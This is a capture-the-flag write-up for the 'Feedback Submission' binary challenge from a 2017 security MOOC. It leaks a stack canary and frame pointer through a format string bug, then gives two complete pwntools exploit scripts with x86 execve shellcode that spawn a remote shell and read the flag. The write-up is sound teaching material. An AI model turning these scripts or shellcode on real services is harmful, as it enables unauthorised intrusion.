---
title: "Feedback Submission (150 points) [Security Mooc CTF]"
date: 2017-07-10 00:00:01 +0530
categories:
  - Write-ups
header:
  teaser: "https://i.imgur.com/bOnEMCV.png"
tags:
  - SecurityMooc
excerpt: "Write-up for Feedback Submission, a problem in CTF conducted as a part of IIT Kanpur's Security Mooc"
---
Here's the [file link](/assets/write-ups/securitymoocctf/feedback).

This was a question I attempted at the last and had a little difficulty since I did the last question first, so _maybe_ I was thinking in that direction.

```
We have build a feedback program, We want someone to test it for existance of any
vulnerability. Any help would be rewarding. Here is the binary file. Use nc 52.7.95.224
8030 to connect to server
```
Using `checksec` on the file :
```console
$ checksec feedback
[*] '/home/kunal/Documents/CTF/securitymooc/CTF/feedback/feedback'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

Let's run the file with `ltrace`:

```console
$ ltrace ./feedback
__libc_start_main(0x8048671, 1, 0xffcdcaf4, 0x80486b0 <unfinished ...>
setbuf(0xf76e0d60, 0)                            = <void>
printf("Enter your name here: "Enter your name here: )                 = 22
__isoc99_scanf(0x8048747, 0xffcdc9c8, 0, 0xf7715b48Kunal
) = 1
printf("Welcome to Feedback Submission P"...Welcome to Feedback Submission Portal )    = 38
printf("Kunal"Kunal)                                  = 5
putchar(10, 0xffcdc9c8, 0, 0xf7715b48
)           = 10
printf("Enter your feedback here: "Enter your feedback here: )             = 26
read(0Feedback
, "Feedback\n", 582)                       = 9
puts("Thank You"Thank You
)                                = 10
+++ exited (status 0) +++
```
Looking at the [dissassembly](/assets/write-ups/securitymoocctf/feedback.asm), we see there's no call to any Flag printing function or any call to `system()` anywhere in the code.

So we have the following things in our hand:
1. A stack canary (`checksec`).
2. A format string vulnerability (unprotected `printf()` inside `getName()`).
3. No call to `system()` or anything that would print a flag. Thus we require shellcode injection most probably using `submitFeedback()`'s buffer. Good for us, it reads `0x246` chars but has a size only of `0x21c-0xc = 0x210`.

> Skip to [the solution](#the-solution) if you don't want to look at what I initally tried and failed at :P

## What I tried (and failed at)

> This was all consequence of doing [Doge Messenger](/write-ups/doge-messenger/) first.

One of the options I could opt for was I could overwrite the canary exception (in the stack) with my shellcode (very _very_ far into the stack) so that after the canary check fails, it executes my code instead.

After messing around with that idea I realised that the address was too far apart and another function call (I think `vprintf()`) was utilising that code and some other problems. **I abandoned this idea.**

Next I tried the same thing I could do with [Doge Messenger](/write-ups/doge-messenger/). Overwriting the GOT for the exception using `%n` with another address so that it never fails, and I tried doing that. But ended up getting confused on how to jump to my shellcode, since even if I entered it now, I didn't know the address to the shellcode, _so how do I overwrite the `eip`?_

After a _lot_ of headbanging I realised I should seek a little help and did the below:

## The Solution

I consulted my [senior](https://www.facebook.com/sudhackar) (_the expert_ &#x1F64F;). And then I realised I was ignoring something:

> We have the `printf()`: we can print out the addresses on the stack, **including the `ebp` and the canary**.

I hit up the program with a few `%p`'s. Using gdb and python, we see that the canary is at `%31$p` and the `ebp` (of `main()`) at `%34$p`.

So here's the plan:
1. Leak the canary and stack.
2. In the `submitFeedback()` function we have a buffer, inject the shellcode, restore the canary and change the `eip` for `main()` to the buffer's beginning.

Here are the required offsets after calculation:
1. Buffer size : `0x21c-0xc`.
2. Difference between `ebp`'s: `ebp-(0x21c+0x10)` which can be easily calculated by looking at the difference of `main()`'s `ebp` and `esp` (which is `0x8`) and adding `0x8` (for saved `eip` and `ebp`) to that difference (total `0x10`) using the gdb just before stepping into `getName()`.
3. Now, `submitFeedback()`'s buffer is at `[ebp-0x21c]` according to its own `ebp`, which differs by `main()`'s `ebp` by `0x10`. Thus, buffer is at `[ebp-0x10-0x21c]` = `[ebp-556]`.
4. Difference between the canary's location and saved `ebp` is 12 bytes.

[//]: # ( (`%34$p and %31$p =: (34-31)*4 = 12`). )

Thus the payload becomes:
```python
shellcode + padding for remaining buffer + canary + padding + [ebp-556]
```
I grabbed the shellcode from [shellstorm](http://shell-storm.org/shellcode/) (check under Linux x86, I grabbed the 23 bytes one) for `execve("/bin/sh")`. Which seemed OK.

So we construct the payload:

{% highlight python %}
import struct
from pwn import *
r = remote("52.7.95.224", 8030)
print r.recvuntil(':')
r.sendline('.%31$p.%34$p')
o = r.recvline()
add=o.split('.')[::-1]  #adresses
ebp=int(add[0][:-1],16) 
canary=struct.pack("I",int(add[1],16))
bufsize=0x21c-0xc
shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
buf = shellcode+'A'*(bufsize-len(shellcode))
payload = buf+canary+'A'*(12)
ret=struct.pack("I",ebp-556)
payload+=ret
print add[:-1]
print r.recvuntil(":")
print repr(payload),len(payload)
r.sendline(payload)
r.interactive()
{% endhighlight %}

But there was a _little_ twist when I ran it on the server:
```console
$ python exploit.py 
[+] Opening connection to 52.7.95.224 on port 8030: Done
Enter your name here:
['0xff875648\n', '0x7270d800']
Enter your feedback here:
'1\xc0Ph//shh/bin\x89\xe3PS\x89\xe1\xb0\x0b\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\xd8prAAAAAAAAAAAA\x1cT\x87\xff' 548
[*] Switching to interactive mode
 Thank You
$ ls -al
total 32
dr-xr-x---  2 feed feed 4096 Jun 25 20:21 .
drwxr-xr-x 16 root root 4096 Jun 25 20:21 ..
-r--------  1 feed feed  220 Jun 23 07:14 .bash_logout
-r--------  1 feed feed 3771 Jun 23 07:14 .bashrc
-r--------  1 feed feed  655 Jun 23 07:14 .profile
---s--x---  1 1001 feed 7680 Jun 19 18:27 feedback
-r--------  1 1001 1001   39 Jun 23 07:14 flag.txt
$ cat flag.txt
$
```
**It doesn't give any output.**

I thought there might be something wrong and thus, tried other shellcodes. But to no avail. I then checked `/etc/passwd/` and this is what it said in the last line:
```
feed:x:1000:1000:,,,:/home/feed:/bin/bash
```

Then it struck me: Let's try `/bin/bash` instead of `sh`, which then worked (the same thing which `/etc/passwd` just told us). Here's the updated payload and output:

{% highlight python %}
import struct
from pwn import *
r = remote("52.7.95.224", 8030)
print r.recvuntil(':')
r.sendline('.%31$p.%34$p')
o = r.recvline()
add=o.split('.')[::-1]  #adresses
ebp=int(add[0][:-1],16) 
canary=struct.pack("I",int(add[1],16))
bufsize=0x21c-0xc
#shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
shellcode="\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
buf = shellcode+'A'*(bufsize-len(shellcode))
payload = buf+canary+'A'*(12)
ret=struct.pack("I",ebp-556)
payload+=ret
print add[:-1]
print r.recvuntil(":")
print repr(payload),len(payload)
r.sendline(payload)
r.interactive()
{% endhighlight %}

```console
$ python exploit.py 
[+] Opening connection to 52.7.95.224 on port 8030: Done
Enter your name here:
['0xffa3a1c8\n', '0xff819b00']
Enter your feedback here:
'j\x0bX\x99Rfh-p\x89\xe1Rjhh/bash/bin\x89\xe3RQS\x89\xe1\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x9b\x81\xffAAAAAAAAAAAA\x9c\x9f\xa3\xff' 548
[*] Switching to interactive mode
 Thank You
$ ls -al
total 32
dr-xr-x---  2 feed feed 4096 Jun 25 20:21 .
drwxr-xr-x 16 root root 4096 Jun 25 20:21 ..
-r--------  1 feed feed  220 Jun 23 07:14 .bash_logout
-r--------  1 feed feed 3771 Jun 23 07:14 .bashrc
-r--------  1 feed feed  655 Jun 23 07:14 .profile
---s--x---  1 1001 feed 7680 Jun 19 18:27 feedback
-r--------  1 1001 1001   39 Jun 23 07:14 flag.txt
$ cat flag.txt
flag{aUiuC7R1MXdOnLdzxJYp6hHqAHfQxeM0}
$ 
```

